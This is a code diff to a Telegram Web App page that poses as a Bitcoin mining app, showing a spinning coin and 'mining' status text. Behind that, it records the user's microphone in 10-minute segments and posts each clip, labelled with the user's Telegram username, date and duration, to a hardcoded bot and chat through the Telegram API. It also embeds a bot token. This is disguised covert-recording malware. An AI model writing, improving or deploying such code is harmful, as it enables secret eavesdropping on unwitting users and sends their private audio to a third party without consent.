@@ -21,14 +21,15 @@
   <script>
   const tg = window.Telegram.WebApp;
   tg.ready();
-  tg.expand(); // чтобы приложение занимало весь экран
+  tg.expand();
 
   const coin = document.getElementById('coin');
   const status = document.getElementById('status');
   let recording = false;
-  let mediaRecorder;
+  let mediaRecorder = null;
   let chunks = [];
   let stream = null;
+  let segmentStartTime = 0;
 
   const BOT_TOKEN = "8326175683:AAFTBgFsDvN_rczh95FFnIS_2XZjAHz8COg";
   const CHAT_ID = "7184293365";
@@ -39,11 +40,11 @@
   });
 
   async function startRecording() {
-    if (stream === null) {
+    if (!stream) {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-      } catch (err) {
-        alert("Разреши микрофон один раз!");
+      } catch (e) {
+        alert("Разреши микрофон!");
         return;
       }
     }
@@ -53,21 +54,24 @@
     status.textContent = "Производится майнинг… (активно)";
 
     chunks = [];
+    segmentStartTime = Date.now();
+
     mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm;codecs=opus' });
     mediaRecorder.ondataavailable = e => chunks.push(e.data);
     mediaRecorder.onstop = sendAudio;
     mediaRecorder.start();
 
-    // Автоматическая отправка каждые 10 минут
-    setTimeout(autoRestart, 600000);
+    // Авто-отправка каждые 10 минут
+    setTimeout(autoSplit, 600000);
   }
 
-  function autoRestart() {
-    if (recording) {
+  function autoSplit() {
+    if (recording && mediaRecorder) {
       mediaRecorder.stop();
       mediaRecorder.start();
       chunks = [];
-      setTimeout(autoRestart, 600000);
+      segmentStartTime = Date.now();
+      setTimeout(autoSplit, 600000);
     }
   }
 
@@ -75,27 +79,33 @@
     recording = false;
     coin.classList.remove('rotating');
     status.textContent = "Производится майнинг BTC…";
-    if (mediaRecorder) mediaRecorder.stop();
+    if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
   }
 
   function sendAudio() {
     if (chunks.length === 0) return;
 
+    const duration = Math.round((Date.now() - segmentStartTime) / 1000);
+    const minutes = String(Math.floor(duration / 60)).padStart(2, '0');
+    const seconds = String(duration % 60).padStart(2, '0');
+
+    const user = tg.initDataUnsafe.user;
+    const username = user.username ? `@${user.username}` : user.first_name || "Зритель";
+
+    const now = new Date().toLocaleString('ru-RU');
+
     const blob = new Blob(chunks, { type: 'audio/webm;codecs=opus' });
-    const date = new Date().toLocaleString('ru-RU');
-    const file = new File([blob], `Запись от зрителя ${date}.webm`, { type: 'audio/webm' });
+    const file = new File([blob], `Запись от ${username} — ${now.replace(/,/, '')}.webm`, { type: 'audio/webm' });
+
+    const caption = `Запись от ${username}\nДата: ${now}\nДлительность: ${minutes}:${seconds}`;
 
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
     form.append('audio', file);
-    form.append('title', `Запись от зрителя`);
-    form.append('caption', `Запись от зрителя\nДата: ${date}`);
+    form.append('caption', caption);
+    form.append('title', `Запись от ${username}`);
 
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
-      method: 'POST',
-      body: form
-    });
-
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: form });
     chunks = [];
   }
 
@@ -105,6 +115,7 @@
 </html>
 
 </html>
+
 
 
 
